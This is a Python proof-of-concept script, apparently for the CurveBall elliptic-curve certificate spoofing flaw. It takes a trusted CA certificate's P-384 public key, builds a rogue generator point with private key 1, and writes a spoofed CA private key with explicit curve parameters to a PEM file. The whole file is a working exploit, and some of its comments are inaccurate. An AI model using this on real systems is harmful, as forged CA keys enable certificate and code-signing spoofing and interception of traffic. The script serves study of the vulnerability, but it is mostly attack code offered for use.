#!/usr/bin/env python
import gmpy2
import sys

from fastecdsa.curve import P384
from fastecdsa.point import Point
from Crypto.Util.asn1 import DerSequence, DerOctetString, DerBitString, DerObjectId
from Crypto.IO import PEM
from Crypto.PublicKey import ECC
from binascii import hexlify

# Creates a DER-encoded key structure from private key and generator
def generate_privkey(d, generator):
    """
        Generate a private key with explicit parameters.

        Paramaters defining an elliptic curve for cryptography
        Weierstrass equation of an elliptic curve: y^2 = x^3 + ax + b
        Prime modulus p: defines the size of the finite field in which the curve is defined.
        Curve order q: Total number of points satisfying the curve equation within its finite field.
        Generator (base point) G: the base point used to generate all other points on the curve with scalar multiplication.
        coefficients a and b: constants defined by the curve used, affecting its slope and shape

    """


    # The size (in bytes) of the modulus for a 384 curve (384/8 = 48)
    modulus_bytes = 48
    # Sets the coefficient a, ensuring it is within the finie field define by prime modulus p
    a = P384.a % P384.p
    # Calculates the scalar multiplication of the generator by the private key d, to find the corresponding pubic key point.
    # (Since private key is 1, the public key = generator (Q=d*G, Q=1*G, Q=G))
    public_key = d * generator
    # Encodes generator into a byte string in the correct format
    generator = (b'\x04' +
        generator.x.to_bytes(modulus_bytes, "big") +
        generator.y.to_bytes(modulus_bytes, "big"))
    # Encodes the private key
    public_key = (b'\x04' + 
                    public_key.x.to_bytes(modulus_bytes, "big") +
                    public_key.y.to_bytes(modulus_bytes, "big"))

    # DER-encoded sequence representing the field paramaters of the curve (prime field, prime modulus)
    field_parameters =  DerSequence([DerObjectId("1.2.840.10045.1.1"), P384.p])
    # Encapsulates the parameters of the elliptic curve in a DER-encoded format
    parameters = [DerSequence([1, field_parameters,
                    DerSequence([
                    DerOctetString(a.to_bytes(modulus_bytes, "big")),
                    DerOctetString(P384.b.to_bytes(modulus_bytes, "big"))]),
                    DerOctetString(generator),
                    P384.q,
                1
            ])]
    # Prepares the DER-encoded structure including the privkey, pubkey, and curve paramaters
    seq = [1,
            # Private key as a DER-encoded octet string
            DerOctetString(d.to_bytes(modulus_bytes, "big")),
            # DER-encoded sequence of curve parameters
            DerSequence(parameters, implicit=0),
            # DER-encoded bit string representing the public key, and explicitly tagged
            DerBitString(public_key, explicit=1)]
    # returns the DER-encoded key structure
    return seq

if __name__ == "__main__":

    # Check number of cmd-line args
    if len(sys.argv) != 2:
        print("Usage " + sys.argv[0] + " trusted-certificate.pem")
        sys.exit()

    # Public key extraction
    cert = open(sys.argv[1], "r")
    pubkey = ECC.import_key(cert.read())
    cert.close()
    # Number of bytes in the point Q. i.e. x = 32b + y = 32b = 64b
    nb_bytes = pubkey.pointQ.size_in_bytes()

    # Check that the correct curve is used
    if pubkey.curve != "NIST P-384":
        print("Public key must be on P-384 curve")
        sys.exit()

    # Get the point (x, y coords) of public key point Q 
    Q = Point(int(pubkey.pointQ.x), int(pubkey.pointQ.y), curve=P384)

    # Generate rogue generator
    # Use a private key of 1
    privkey = 1
    # can be used because 1^-1 = 1; othewise would need to find inverse:
    # Find inverse of {priv key value} mod the order of the curve
    #privkey = int(gmpy2.invert({priv key value}, P384.q))
    # we multiply our public key Q with the inverse of our chosen private key value
    # This is the new generator point to be used
    spoofedGenerator = 1 * Q
    # Create DER-enc sequence using the priivate key and generator
    der = DerSequence(generate_privkey(privkey, spoofedGenerator))
    # Create a new file for the spoofed key and open in write mode
    f = open('spoofed-ca-key.pem','w')
    # Encodes the DER key structure into a PEM formatted EC private key
    keyfile = PEM.encode(der.encode(), 'EC PRIVATE KEY')
    # Write to file. It should be a valid PEM-encoded private key
    f.write(keyfile)
    f.close()